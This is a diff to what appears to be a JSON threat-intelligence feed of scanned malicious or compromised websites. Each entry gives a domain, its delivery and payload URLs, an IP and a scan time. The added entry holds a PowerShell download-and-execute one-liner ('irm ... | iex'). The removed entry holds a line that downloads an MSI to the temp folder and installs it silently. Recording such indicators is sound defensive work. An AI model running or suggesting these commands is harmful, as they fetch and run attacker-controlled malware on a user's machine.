@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "ondemandpharma.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/gabo58lfmx/aca3a98798ec3d08"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/gabo58lfmx/aca3a98798ec3d08"
+    ],
+    "ReportId": "cmwn587041vmx0omlbdxa6kbs",
+    "ScannedAt": "2026-11-19T06:02:27.071000+00:00"
+  },
+  {
     "UrlDomain": "laavenderlandscape.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -9940,24 +9959,5 @@
     ],
     "ReportId": "cmwerxwap0e0d0omlo90ozon6",
     "ScannedAt": "2026-11-13T09:28:22.206000+00:00"
-  },
-  {
-    "UrlDomain": "camillesuarez.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "199.188.200.146"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwel9plu0czo0omlez5ttanw",
-    "ScannedAt": "2026-11-13T06:21:36.065000+00:00"
   }
 ]
